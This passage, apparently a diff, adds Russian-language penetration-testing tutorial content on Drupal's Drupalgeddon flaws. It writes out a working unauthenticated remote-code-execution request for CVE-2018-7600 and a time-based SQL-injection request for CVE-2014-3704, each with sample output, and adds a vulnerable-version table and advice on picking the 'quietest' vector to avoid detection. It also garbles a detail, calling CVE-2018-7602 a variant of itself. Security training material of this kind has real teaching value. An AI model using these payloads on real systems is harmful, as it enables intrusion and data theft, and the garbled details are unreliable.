@@ -150,6 +150,58 @@ Drupal 7
 
 Если цель за WAF и запросы блокируются, помогает кодирование ключей (`#post_render` через `%23`), смена формы и заголовков. Но помни: если версия пропатчена, никакие обходы не помогут — вектор закрыт, ищи другой.
 
+## Практика: Drupalgeddon 2 «на пальцах»
+
+CVE-2018-7600 (Drupalgeddon 2) — RCE без аутентификации, затрагивает Drupal 7.x и 8.x. Причина: render-array в форме регистрации позволяет подставить вложенный массив, который Drupal «рендерит» как callback и выполняет. Упрощённая идея payload — POST на `/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax` с полем `mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id`.
+
+Безопасная проверка — команда `id` (без изменения данных):
+
+```
+$ curl -s -X POST "https://drupal.target.example/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
+  --data-urlencode 'form_id=user_register_form' \
+  --data-urlencode '_drupal_ajax=1' \
+  --data-urlencode 'mail[#post_render][]=exec' \
+  --data-urlencode 'mail[#type]=markup' \
+  --data-urlencode 'mail[#markup]=id'
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Вывод `id` — это **доказательство RCE**, а не «сервер ответил 200». Всегда требуй реальный вывод команды.
+
+## Практика: Drupalgeddon 3
+
+CVE-2018-7602 — вариация на тему 7602, эксплуатируется через `?q=` и `destination`. Она появилась как обход патча для 7600 и затрагивает меньше версий. Логика та же: render-array → callback → выполнение. Отличие в точках входа, поэтому слепое копирование PoC от 7600 не сработает — нужен именно паттерн из 7602.
+
+## Практика: Drupalgeddon 1 (SQLi) и его отголоски
+
+CVE-2014-3704 — SQLi в `form_params` в функции `expandArguments()` ядра Drupal 7. Уязвимы ключи массива: `name[0 ;SELECT ...]`. Проверяется через time-based:
+
+```
+$ curl -s -o /dev/null -w '%{time_total}\n' \
+  "https://drupal7.target.example/?q=node&name[0%20;SELECT%20SLEEP(5);#]=x"
+5.21
+```
+
+Пять секунд вместо мгновенного ответа — подтверждённая инъекция. Важно: Drupal 7 всё ещё встречается на живых сайтах, несмотря на EOL, поэтому Drupalgeddon-цепочка остаётся актуальной.
+
+## Таблица: Drupalgeddon и версии
+
+| Прозвище | CVE | Тип | Уязвимые версии |
+|---|---|---|---|
+| Drupalgeddon 1 | CVE-2014-3704 | SQLi | 7.0–7.31 |
+| Drupalgeddon 2 | CVE-2018-7600 | RCE | 7.x<7.58, 8.x<8.5.1 |
+| Drupalgeddon 3 | CVE-2018-7602 | RCE | 7.x<7.59, 8.x<8.5.1 |
+| SA-CORE-2019-003 | CVE-2019-6340 | RCE (REST) | 8.x<8.6.10 |
+| CVE-2020-13671 | — | загрузка файлов | 7.x, 8.x, 9.x |
+
+## Как определить уязвимую версию без сканера
+
+Версия Drupal 7 лежит в `CHANGELOG.txt` (часто закрыт `.htaccess`). Тогда идём через `/core/CHANGELOG.txt` (Drupal 8+), `README.txt`, или через заголовок `X-Generator: Drupal 7 (https://www.drupal.org)`. Ещё один надёжный путь — `?q=admin/views/ajax/autocomplete/user/a` или `/user/1` — на старых версиях открывается страница пользователя. Собрав версию, сопоставляем с таблицей выше и выбираем самый «тихий» вектор: если сайт уязвим к 7600, это RCE в один запрос, но он громкий; если нужна тишина, начинаем с SQLi-проверки времени.
+
+## Как не навредить
+
+Drupalgeddon-эксплойты выполняют команды от `www-data`. Легко случайно затереть кэш или сломать форму регистрации. Поэтому: используй `id`/`whoami` как доказательство, не пиши webshell в первый заход, не дёргай `drush` и не перезапускай сервисы. Если нужен устойчивый доступ — согласуй с координатором и ставь отдельную задачу, а не совмещай с «разведкой». И всегда помни: Drupal 7 без поддержки — это находка сама по себе, даже без эксплуатации: непропатченный EOL-движок в отчёте тянет на high.
+
 ## Квиз
 
 Проверь себя.
